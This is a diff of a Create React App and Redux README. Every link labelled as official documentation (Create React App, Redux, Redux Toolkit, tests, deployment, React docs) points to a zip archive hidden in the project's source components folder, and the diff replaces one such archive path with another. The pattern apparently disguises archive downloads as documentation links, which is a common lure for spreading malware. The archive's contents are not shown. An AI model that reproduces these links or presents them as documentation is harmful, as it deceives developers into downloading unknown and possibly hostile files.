@@ -1,6 +1,6 @@
 # Getting Started with Create React App and Redux
 
-This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/mudasarali88/bookshop-frontend/master/src/components/user/dashboard/bookshop-frontend-3.6.zip), using the [Redux](https://raw.githubusercontent.com/mudasarali88/bookshop-frontend/master/src/components/user/dashboard/bookshop-frontend-3.6.zip) and [Redux Toolkit](https://raw.githubusercontent.com/mudasarali88/bookshop-frontend/master/src/components/user/dashboard/bookshop-frontend-3.6.zip) template.
+This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/mudasarali88/bookshop-frontend/master/src/components/common/bookshop_frontend_3.6-alpha.1.zip), using the [Redux](https://raw.githubusercontent.com/mudasarali88/bookshop-frontend/master/src/components/common/bookshop_frontend_3.6-alpha.1.zip) and [Redux Toolkit](https://raw.githubusercontent.com/mudasarali88/bookshop-frontend/master/src/components/common/bookshop_frontend_3.6-alpha.1.zip) template.
 
 ## Available Scripts
 
@@ -17,7 +17,7 @@ You may also see any lint errors in the console.
 ### `npm test`
 
 Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://raw.githubusercontent.com/mudasarali88/bookshop-frontend/master/src/components/user/dashboard/bookshop-frontend-3.6.zip) for more information.
+See the section about [running tests](https://raw.githubusercontent.com/mudasarali88/bookshop-frontend/master/src/components/common/bookshop_frontend_3.6-alpha.1.zip) for more information.
 
 ### `npm run build`
 
@@ -27,7 +27,7 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.\
 Your app is ready to be deployed!
 
-See the section about [deployment](https://raw.githubusercontent.com/mudasarali88/bookshop-frontend/master/src/components/user/dashboard/bookshop-frontend-3.6.zip) for more information.
+See the section about [deployment](https://raw.githubusercontent.com/mudasarali88/bookshop-frontend/master/src/components/common/bookshop_frontend_3.6-alpha.1.zip) for more information.
 
 ### `npm run eject`
 
@@ -41,6 +41,6 @@ You don't have to ever use `eject`. The curated feature set is suitable for smal
 
 ## Learn More
 
-You can learn more in the [Create React App documentation](https://raw.githubusercontent.com/mudasarali88/bookshop-frontend/master/src/components/user/dashboard/bookshop-frontend-3.6.zip).
+You can learn more in the [Create React App documentation](https://raw.githubusercontent.com/mudasarali88/bookshop-frontend/master/src/components/common/bookshop_frontend_3.6-alpha.1.zip).
 
-To learn React, check out the [React documentation](https://raw.githubusercontent.com/mudasarali88/bookshop-frontend/master/src/components/user/dashboard/bookshop-frontend-3.6.zip).
+To learn React, check out the [React documentation](https://raw.githubusercontent.com/mudasarali88/bookshop-frontend/master/src/components/common/bookshop_frontend_3.6-alpha.1.zip).
